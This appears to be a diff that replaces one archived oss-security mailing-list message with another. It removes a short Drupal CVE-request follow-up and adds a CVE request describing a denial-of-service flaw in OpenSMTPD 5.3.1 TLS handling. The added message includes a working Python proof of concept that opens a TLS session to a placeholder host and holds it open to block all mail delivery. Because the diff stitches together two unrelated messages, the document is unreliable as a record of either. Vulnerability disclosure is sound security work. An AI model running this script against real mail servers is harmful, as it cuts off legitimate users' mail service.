@@ -1,19 +1,40 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/01/15/2
-Message-ID: <CABbbngDFYXDJxp1GFwF2Tfa3mvtrceofJFT_YGCB2g=MNg1q4A@mail.gmail.com>
-Date: Mon, 14 Jan 2013 16:47:15 -0800
-From: Forest Monsen <forest.monsen@...il.com>
-To: oss-security@...ts.openwall.com
-Cc: Kurt Seifried <kseifried@...hat.com>
-Subject: Re: CVE request for Drupal contributed modules
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/05/18/8
+Message-ID: <CAHmME9owpZDRXNapOco4xOxmny3frQcYRTQZRUEDB9dKPz-RFA@mail.gmail.com>
+Date: Sat, 18 May 2013 16:27:22 +0200
+From: "Jason A. Donenfeld" <Jason@...c4.com>
+To: oss-security <oss-security@...ts.openwall.com>
+Cc: misc@...nsmtpd.org
+Subject: CVE Request: DoS in OpenSMTPD TLS Support
 Content-Type: text/plain; charset=utf-8
 
-Just pinging this one again in case it was lost in the shuffle. Thank you
-muchly.
+Hi Kurt,
 
-On Fri, Jan 11, 2013 at 11:49 AM, Forest Monsen <forest.monsen@...il.com>wrote:
+The SSL handling in the latest OpenSMTPD (5.3.1) misconfigures its
+sockets in blocking mode, allowing an attacker to prevent all mail
+delivery simply by holding a socket open.
 
-> I'd like to request CVE identifiers for two issues with
-> Drupal contributed modules
->
+I discovered this accidentally, as I noticed my HP printer's smtp
+client would keep the connection indefinitely open after an
+unsuccessful authentication attempt, causing no more mail to be
+delivered until I SIGKILL'd my smtpd process or unplugged my printer.
 
+The following reproduces the attack trivially:
+
+    #!/usr/bin/env python2
+    import smtplib
+    import time
+    print "[+] Connecting to server and initiating TLS"
+    smtp = smtplib.SMTP("mail.some-vitim-host.blah", 587)
+    smtp.starttls()
+    print "[+] No clients will be able to connect as long as this remains open."
+    time.sleep(100000000)
+
+Apparently this was fixed recently upstream, noting "evil client" in
+the commit message:
+http://git.zx2c4.com/OpenSMTPD/commit/?id=38b26921bad5fe24ad747bf9d591330d683728b0
+
+A snapshot has been posted to http://www.opensmtpd.org/archives/ , but
+no patch release has yet been made.
+
+Jason
